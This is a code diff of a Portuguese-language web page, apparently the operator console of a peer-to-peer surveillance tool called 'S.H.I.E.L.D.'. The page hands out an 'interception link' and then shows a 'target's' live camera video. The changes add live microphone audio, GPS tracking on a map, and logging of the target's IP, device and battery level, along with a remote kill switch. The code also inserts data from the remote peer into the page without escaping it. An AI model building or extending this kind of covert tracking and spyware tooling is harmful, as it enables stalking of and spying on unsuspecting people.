@@ -1,12 +1,16 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-PT">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S.H.I.E.L.D. | Monitoramento P2P</title>
+    <title>S.H.I.E.L.D. | Monitorização P2P</title>
+
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
     <style>
         body {
             background-color: #0b1120;
@@ -34,6 +38,7 @@
             }
         }
 
+        /* Scrollbar customizada */
         ::-webkit-scrollbar {
             width: 6px;
         }
@@ -46,17 +51,61 @@
             background: #334155;
             border-radius: 4px;
         }
+
+        /* Marcador Pulsante do Mapa */
+        .pulsing-marker {
+            position: relative;
+        }
+
+        .pulsing-marker .dot {
+            width: 12px;
+            height: 12px;
+            background: #0ea5e9;
+            border-radius: 50%;
+            position: absolute;
+            top: -6px;
+            left: -6px;
+            box-shadow: 0 0 10px #0ea5e9;
+        }
+
+        .pulsing-marker .ring {
+            width: 30px;
+            height: 30px;
+            border: 2px solid #0ea5e9;
+            border-radius: 50%;
+            position: absolute;
+            top: -15px;
+            left: -15px;
+            animation: pulsate 1.5s ease-out infinite;
+        }
+
+        @keyframes pulsate {
+            0% {
+                transform: scale(0.1);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(1.2);
+                opacity: 0;
+            }
+        }
+
+        /* Esconder a marca de água do Leaflet para um aspeto mais limpo */
+        .leaflet-control-attribution {
+            display: none !important;
+        }
     </style>
 </head>
 
 <body class="flex flex-col items-center justify-center min-h-screen p-4 md:p-8">
 
-    <div class="max-w-5xl w-full bg-slate-900 rounded-2xl p-6 shadow-2xl border border-slate-800 glitch-border">
+    <div class="max-w-6xl w-full bg-slate-900 rounded-2xl p-6 shadow-2xl border border-slate-800 glitch-border">
         <div class="flex justify-between items-center mb-6 border-b border-slate-800 pb-4">
-            <h1 class="text-2xl font-bold tracking-tight text-sky-400">Terminal de Ligação P2P</h1>
+            <h1 class="text-2xl font-bold tracking-tight text-sky-400">Terminal de Monitorização Tática</h1>
             <div class="flex items-center gap-2 px-3 py-1 bg-slate-950 rounded-full border border-slate-800">
                 <div id="status-indicator" class="w-2 h-2 rounded-full bg-amber-500 status-dot"></div>
-                <span id="status-text" class="text-xs font-mono text-slate-300">Inicializando rede...</span>
+                <span id="status-text" class="text-xs font-mono text-slate-300">A inicializar rede...</span>
             </div>
         </div>
 
@@ -64,7 +113,7 @@
             <div class="lg:col-span-1 space-y-4 flex flex-col">
                 <div class="p-4 bg-slate-950 rounded-xl border border-slate-800">
                     <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Link de
-                        Interceptação</label>
+                        Interceção</label>
                     <input type="text" id="link-input" readonly
                         class="w-full bg-slate-900 text-sky-300 px-3 py-2 rounded focus:outline-none text-xs font-mono border border-slate-700 mb-2">
                     <button onclick="copiarLink()"
@@ -73,39 +122,61 @@
                 </div>
 
                 <div class="p-4 bg-slate-950 rounded-xl border border-slate-800 flex-1 flex flex-col">
-                    <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Telemetria
-                        do Alvo</label>
+                    <label class="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">Registo de
+                        Eventos</label>
                     <div id="log-panel"
-                        class="flex-1 bg-slate-900 rounded border border-slate-800 p-3 text-[10px] font-mono text-slate-400 overflow-y-auto min-h-[200px] max-h-[300px] mb-4 space-y-1">
-                        <div>> Aguardando conexão...</div>
+                        class="flex-1 bg-slate-900 rounded border border-slate-800 p-3 text-[10px] font-mono text-slate-400 overflow-y-auto min-h-[250px] max-h-[400px] mb-4 space-y-1">
+                        <div>> A aguardar conexão...</div>
                     </div>
                     <button id="btn-stop" onclick="encerrarConexao()" disabled
                         class="w-full mt-auto bg-red-900/50 hover:bg-red-600 text-red-200 px-4 py-3 rounded text-sm transition font-medium border border-red-800 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2">
-                        Encerrar Protocolo
+                        Abortar Missão
                     </button>
                 </div>
             </div>
 
-            <div
-                class="lg:col-span-3 relative w-full aspect-video bg-black rounded-xl overflow-hidden border border-slate-800 shadow-inner">
-                <video id="remote-video" class="w-full h-full object-cover transition-opacity duration-500 opacity-0"
-                    autoplay playsinline></video>
+            <div class="lg:col-span-3 flex flex-col gap-4">
 
-                <div id="overlay-layer"
-                    class="absolute inset-0 flex flex-col items-center justify-center bg-slate-950/80 backdrop-blur-sm z-10 transition-opacity duration-300">
-                    <svg class="w-12 h-12 text-slate-600 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
-                            d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z">
-                        </path>
-                    </svg>
-                    <span id="overlay-text" class="text-slate-400 font-mono text-sm tracking-wide">Aguardando
-                        Feed...</span>
+                <div
+                    class="relative w-full aspect-video bg-black rounded-xl overflow-hidden border border-slate-800 shadow-inner group flex-1">
+                    <video id="remote-video"
+                        class="w-full h-full object-cover transition-opacity duration-500 opacity-0" autoplay
+                        playsinline></video>
+
+                    <div class="absolute top-4 left-4 bg-slate-900/80 px-2 py-1 rounded border border-slate-700 hidden group-hover:flex items-center gap-2 z-20 transition-opacity"
+                        id="audio-indicator">
+                        <div class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
+                        <span class="text-[10px] font-mono text-slate-300">MIC ATIVO</span>
+                    </div>
+
+                    <div id="overlay-layer"
+                        class="absolute inset-0 flex flex-col items-center justify-center bg-slate-950/80 backdrop-blur-sm z-10 transition-opacity duration-300">
+                        <svg class="w-12 h-12 text-slate-600 mb-3" fill="none" stroke="currentColor"
+                            viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                                d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z">
+                            </path>
+                        </svg>
+                        <span id="overlay-text" class="text-slate-400 font-mono text-sm tracking-wide">A aguardar Feed
+                            A/V...</span>
+                    </div>
                 </div>
+
+                <div id="map-wrapper"
+                    class="hidden w-full h-64 bg-slate-950 border border-slate-800 rounded-xl relative overflow-hidden">
+                    <div
+                        class="absolute top-2 left-2 z-[400] bg-slate-900/90 text-sky-400 text-[10px] font-mono px-2 py-1 rounded border border-slate-700 backdrop-blur-sm">
+                        RASTREAMENTO GPS ATIVO
+                    </div>
+                    <div id="map" class="w-full h-full z-0"></div>
+                </div>
+
             </div>
         </div>
     </div>
 
     <script>
+        // --- NOTIFICAÇÃO DE ABA ---
         const tituloOriginal = document.title;
         let alertaPisca = null;
 
@@ -113,19 +184,49 @@
             if (document.hasFocus()) return;
             let mostrarAlerta = true;
             alertaPisca = setInterval(() => {
-                document.title = mostrarAlerta ? "🔴 [ SINAL DETECTADO ]" : tituloOriginal;
+                document.title = mostrarAlerta ? "🔴 [ SINAL DETETADO ]" : tituloOriginal;
                 mostrarAlerta = !mostrarAlerta;
             }, 1000);
         }
 
         window.addEventListener('focus', () => {
-            if (alertaPisca) {
-                clearInterval(alertaPisca);
-                alertaPisca = null;
-                document.title = tituloOriginal;
-            }
+            if (alertaPisca) { clearInterval(alertaPisca); alertaPisca = null; document.title = tituloOriginal; }
         });
 
+        // --- GESTÃO DO MAPA (LEAFLET) ---
+        let map = null;
+        let mapMarker = null;
+
+        function atualizarMapa(lat, lng) {
+            const mapWrapper = document.getElementById('map-wrapper');
+            mapWrapper.classList.remove('hidden'); // Exibe o container do mapa
+
+            if (!map) {
+                // Inicializa o mapa com o tema escuro
+                map = L.map('map').setView([lat, lng], 16);
+                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                    maxZoom: 19
+                }).addTo(map);
+            } else {
+                map.setView([lat, lng], 16); // Atualiza a posição se já existir
+            }
+
+            // Cria o ícone pulsante
+            const pulsingIcon = L.divIcon({
+                className: 'pulsing-marker',
+                html: '<div class="ring"></div><div class="dot"></div>',
+                iconSize: [0, 0] // Centra exatamente na coordenada
+            });
+
+            // Remove o marcador antigo e adiciona o novo
+            if (mapMarker) map.removeLayer(mapMarker);
+            mapMarker = L.marker([lat, lng], { icon: pulsingIcon }).addTo(map);
+
+            // Força o Leaflet a recalcular o tamanho após ficar visível
+            setTimeout(() => { map.invalidateSize(); }, 200);
+        }
+
+        // --- SISTEMA WEBRTC ---
         const CHAVE_SESSAO = 'shield_agent_id';
         let myId = localStorage.getItem(CHAVE_SESSAO);
         if (!myId) {
@@ -143,13 +244,20 @@
             overlay: document.getElementById('overlay-layer'),
             overlayText: document.getElementById('overlay-text'),
             btnStop: document.getElementById('btn-stop'),
-            logPanel: document.getElementById('log-panel')
+            logPanel: document.getElementById('log-panel'),
+            audioInd: document.getElementById('audio-indicator'),
+            mapWrapper: document.getElementById('map-wrapper')
         };
 
         const addLog = (key, value, isHighlight = false, isAlert = false) => {
             const color = isAlert ? 'text-amber-400 font-bold' : (isHighlight ? 'text-sky-400 font-bold' : 'text-emerald-400');
             const prefix = isAlert ? '⚠️' : '>';
             ui.logPanel.innerHTML += `<div><span class="${isAlert ? 'text-amber-500' : 'text-slate-500'}">${prefix} ${key}:</span> <span class="${color}">${value}</span></div>`;
+            ui.logPanel.scrollTop = ui.logPanel.scrollHeight;
+        };
+
+        const addRawHTML = (htmlString) => {
+            ui.logPanel.innerHTML += htmlString;
             ui.logPanel.scrollTop = ui.logPanel.scrollHeight;
         };
 
@@ -168,28 +276,41 @@
             conexaoDadosAtiva = conn;
             conn.on('data', (data) => {
                 if (data.type === 'TARGET_INFO') {
-                    ui.logPanel.innerHTML += `<div class="mt-2 mb-1 border-b border-slate-700 pb-1 text-sky-500 font-bold">> ASSINATURA DETECTADA</div>`;
-                    addLog('IP', data.ip, true);
-                    addLog('Local', `${data.city}, ${data.region} (${data.country})`);
-                    addLog('Dispositivo', data.device, true);
+                    addRawHTML(`<div class="mt-2 mb-1 border-b border-slate-700 pb-1 text-sky-500 font-bold">> ASSINATURA DETETADA</div>`);
+                    addLog('IP Público', data.ip, true);
                     addLog('Bateria', data.battery);
-                } else if (data.type === 'TARGET_EVENT') {
-                    // Recebe eventos em tempo real (Foco/Bateria)
+                    addLog('Dispositivo', data.device, true);
+                }
+                else if (data.type === 'TARGET_EVENT') {
                     addLog('EVENTO', data.message, false, true);
+                }
+                else if (data.type === 'TARGET_GPS') {
+                    addRawHTML(`
+                        <div class="mt-2 p-2 bg-slate-950 border border-emerald-900 rounded">
+                            <span class="text-emerald-500 font-bold">📍 SATÉLITE FIXADO:</span><br>
+                            <span class="text-slate-500">Precisão: ${data.accuracy} metros</span>
+                        </div>
+                    `);
+                    // Aciona a renderização do mapa
+                    atualizarMapa(data.lat, data.lng);
                 }
             });
         });
 
         peer.on('call', (call) => {
             call.answer();
-            setStatus("Sinal detectado.", "bg-emerald-500");
+            setStatus("Sinal detetado.", "bg-emerald-500");
             ui.btnStop.disabled = false;
 
             call.on('stream', (remoteStream) => {
                 ui.video.srcObject = remoteStream;
                 ui.video.classList.remove('opacity-0');
                 ui.overlay.classList.add('opacity-0', 'pointer-events-none');
-                setStatus("Conexão Ativa.", "bg-emerald-500");
+                ui.audioInd.classList.remove('hidden');
+
+                ui.video.muted = false;
+
+                setStatus("Conexão Ativa (Vídeo + Áudio).", "bg-emerald-500");
                 ativarAlertaAba();
             });
 
@@ -199,17 +320,19 @@
         function encerrarConexao() {
             if (conexaoDadosAtiva) conexaoDadosAtiva.send({ command: 'KILL_SWITCH' });
             resetarInterface();
-            setStatus("Protocolo encerrado.", "bg-red-500");
-            ui.logPanel.innerHTML += `<div class="text-red-400 mt-2">> Conexão cortada.</div>`;
+            setStatus("Missão abortada.", "bg-red-500");
+            addRawHTML(`<div class="text-red-400 mt-2">> Conexão cortada remotamente.</div>`);
         }
 
         function resetarInterface() {
             ui.video.srcObject = null;
             ui.video.classList.add('opacity-0');
             ui.overlay.classList.remove('opacity-0', 'pointer-events-none');
-            ui.overlayText.textContent = "Aguardando reconexão...";
+            ui.audioInd.classList.add('hidden');
+            ui.mapWrapper.classList.add('hidden'); // Esconde o mapa novamente
+            ui.overlayText.textContent = "A aguardar reconexão...";
             ui.btnStop.disabled = true;
-            setStatus("Aguardando feed.", "bg-amber-500");
+            setStatus("A aguardar feed.", "bg-amber-500");
         }
 
         function copiarLink() {
